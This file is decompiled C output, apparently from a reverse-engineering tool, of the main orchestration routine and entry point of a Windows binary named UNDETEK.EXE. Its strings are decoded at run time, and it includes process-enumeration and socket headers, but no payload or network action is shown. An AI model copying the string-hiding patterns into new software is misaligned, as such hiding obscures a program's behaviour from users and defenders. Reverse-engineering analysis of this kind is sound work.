/* ====================================================================== */
/* UNDETEK.EXE — Decompiled Source                                     */
/* Category: main                                                      */
/* /* Main entry, orchestration, startup */                               */
/* Functions: 2                                                         */
/* ====================================================================== */

#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <winsock2.h>
#include <ws2tcpip.h>

/* ---- 0x140007270 : main_orchestrator [was: FUN_140007270] ---- */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined8 FUN_140007270(undefined8 param_1,char *param_2,undefined8 param_3,undefined8 param_4)

{
  char cVar1;
  int iVar2;
  char *pcVar3;
  undefined8 uVar4;
  longlong lVar5;
  undefined1 *puVar6;
  undefined1 auStack_238 [32];
  uint local_218;
  DWORD local_214;
  char *local_210;
  undefined1 local_208 [32];
  undefined1 local_1e8 [80];
  undefined1 local_198 [80];
  undefined1 local_148 [112];
  undefined1 local_d8 [192];
  ulonglong local_18;
  
  local_18 = DAT_14003c2c0 ^ (ulonglong)auStack_238;
  puVar6 = local_198;
  for (lVar5 = 0x43; lVar5 != 0; lVar5 = lVar5 + -1) {
    *puVar6 = 0;
    puVar6 = puVar6 + 1;
  }
  pcVar3 = FUN_1400012d0(local_198);
  pcVar3 = FUN_140001ff0(pcVar3);
  FUN_140007400((longlong)pcVar3,param_2,param_3,param_4);
  cVar1 = FUN_140006f20(pcVar3,param_2,param_3,param_4);
  if (cVar1 == '\0') {
    uVar4 = 1;
  }
  else {
    puVar6 = local_208;
    for (lVar5 = 0x15; lVar5 != 0; lVar5 = lVar5 + -1) {
      *puVar6 = 0;
      puVar6 = puVar6 + 1;
    }
    pcVar3 = FUN_140001250(local_208);
    pcVar3 = FUN_140001d20(pcVar3);
    iVar2 = FUN_140009b90(pcVar3);
    if (iVar2 == 0) {
      puVar6 = local_148;
      for (lVar5 = 99; lVar5 != 0; lVar5 = lVar5 + -1) {
        *puVar6 = 0;
        puVar6 = puVar6 + 1;
      }
      pcVar3 = FUN_140001310(local_148);
      pcVar3 = FUN_140002110(pcVar3);
      FUN_140007400((longlong)pcVar3,param_2,param_3,param_4);
      Sleep(5000);
      uVar4 = 1;
    }
    else {
      uVar4 = FUN_1400037d0();
      local_218 = (uint)uVar4;
      if (local_218 == 0) {
        puVar6 = local_1e8;
        for (lVar5 = 0x41; lVar5 != 0; lVar5 = lVar5 + -1) {
          *puVar6 = 0;
          puVar6 = puVar6 + 1;
        }
        pcVar3 = FUN_1400012b0(local_1e8);
        pcVar3 = FUN_140001f60(pcVar3);
        FUN_140007400((longlong)pcVar3,param_2,param_3,param_4);
      }
      else {
        local_214 = GetLastError();
        puVar6 = local_d8;
        for (lVar5 = 0xb4; lVar5 != 0; lVar5 = lVar5 + -1) {
          *puVar6 = 0;
          puVar6 = puVar6 + 1;
        }
        pcVar3 = FUN_1400013b0(local_d8);
        local_210 = FUN_1400026b0(pcVar3);
        FUN_140007400((longlong)local_210,(ulonglong)local_218,(ulonglong)local_214,param_4);
      }
      Sleep(5000);
      uVar4 = 0;
    }
  }
  return uVar4;
}




/* ---- 0x14000a5f4 : entry_point_winmain [was: entry] ---- */

void entry(void)

{
  FUN_14000aa04();
  __scrt_common_main_seh();
  return;
}




